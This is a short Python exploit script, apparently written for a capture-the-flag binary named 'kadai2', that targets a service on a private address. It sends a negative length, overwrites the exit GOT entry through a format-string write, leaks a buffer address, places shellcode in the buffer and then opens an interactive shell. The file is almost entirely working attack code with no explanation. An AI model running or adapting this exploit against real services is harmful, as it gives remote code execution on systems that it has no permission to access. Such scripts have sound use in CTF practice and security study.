#!/usr/bin/env python
from sc_pwn import *

target     = {'host':'192.168.75.139','port':8080}

binf = ELF('kadai2')
libc = ELF('D:\CTF\FILES\libc-2.19.so_x86_local')

addr_main           = binf.function('main')
addr_got_exit       = binf.got('exit')
addr_got_main       = binf.got('__libc_start_main')

#==========
def attack(cmn):
    # 1st
    fsb = FSB(header=9,count=8-9, size=2)
    fsb.set_adrval(addr_got_exit, addr_main)
    fsb.auto_write(index=15)

    exploit_st1  = sc.sh()
    exploit_st1 += 'a'*(0x20-len(exploit_st1))
    exploit_st1 += pack_32(addr_got_main)
    exploit_st1 += '%15$s'
    exploit_st1 += fsb.get()

    cmn.read_until('length >> ')
    cmn.sendln('-1')
    cmn.read_until('>> ')
    cmn.sendln(exploit_st1)

    addr_buf    = int(cmn.read(8), 16)
    info('addr_buf  = 0x%08x' % addr_buf)

    # 2nd
    fsb = FSB(size=2)
    fsb.set_adrval(addr_got_exit, addr_buf)
    fsb.auto_write(index=15)

    exploit_st2  = 'a'*0x20
    exploit_st2 += fsb.get()

    cmn.read_until('length >> ')
    cmn.sendln('-1')
    cmn.read_until('>> ')
    cmn.sendln(exploit_st2)

#==========

if __name__=='__main__':
    cmn = Communicate(target,mode='SOCKET')
    attack(cmn)

    sh = Shell(cmn)
    sh.select()
    del(sh)
    
    del(cmn)
    
#==========
